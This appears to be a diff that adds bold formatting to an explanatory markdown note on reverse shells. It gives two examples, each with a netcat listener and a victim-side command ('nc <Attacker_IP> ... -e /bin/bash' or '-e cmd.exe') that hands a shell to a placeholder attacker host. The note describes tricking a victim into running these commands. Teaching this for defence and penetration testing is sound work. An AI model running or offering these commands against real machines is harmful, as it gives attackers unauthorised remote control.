@@ -15,31 +15,34 @@ Victim's Machine: When compromised, it connects back to the attacker's machine, 
 # Two Simple Examples:
 
 # Example 1: Attacker on Windows, Victim on Linux
-Attacker (Windows): Sets up a listener using netcat.
+**Attacker (Windows)**: Sets up a listener using netcat.
 
-Command: nc -lvp 4444
-This means: "Listen on port 4444 and wait for a connection."
-Victim (Linux): The attacker tricks the victim into running a command.
+**Command**: nc -lvp 4444
 
-Command: nc <Attacker_IP> 4444 -e /bin/bash
+**This means**: "Listen on port 4444 and wait for a connection."
 
-This means: "Connect to the attacker's IP on port 4444 and give them access to my shell."
+**Victim** (Linux): The attacker tricks the victim into running a command.
 
-Result: The attacker now controls the Linux machine from the Windows machine.
+**Command**: nc <**Attacker_IP**> 4444 -e /bin/bash
+
+**This means**: "Connect to the attacker's IP on port 4444 and give them access to my shell."
+
+**Result**: The attacker now controls the Linux machine from the Windows machine.
 
 # Example 2: Attacker on Linux, Victim on Windows
-Attacker (Linux): Listens for incoming connections.
+**Attacker** (Linux): Listens for incoming connections.
 
-Command: nc -lvp 5555
-Victim (Windows): The attacker gets the victim to run this command.
+**Command**: nc -lvp 5555
 
-Command: nc <![highlight](Attacker_IP)> 5555 -e cmd.exe
+**Victim** (Windows): The attacker gets the victim to run this command.
 
-This means: "Connect to the attacker’s IP on port 5555 and give them access to my Windows command prompt."
+**Command**: nc <**Attacker_IP**> 5555 -e cmd.exe
 
-Result: The attacker now has control over the Windows machine.
+**This means**: "Connect to the attacker’s IP on port 5555 and give them access to my Windows command prompt."
+
+**Result**: The attacker now has control over the Windows machine.
 
 # In Summary:
-Reverse Shell: The victim's machine connects back to the attacker's machine.
-Purpose: Allows remote control over the victim's machine.
-Usage: Often used in penetration testing or by hackers.
+**Reverse Shell**: The victim's machine connects back to the attacker's machine.
+**Purpose**: Allows remote control over the victim's machine.
+**Usage**: Often used in penetration testing or by hackers.
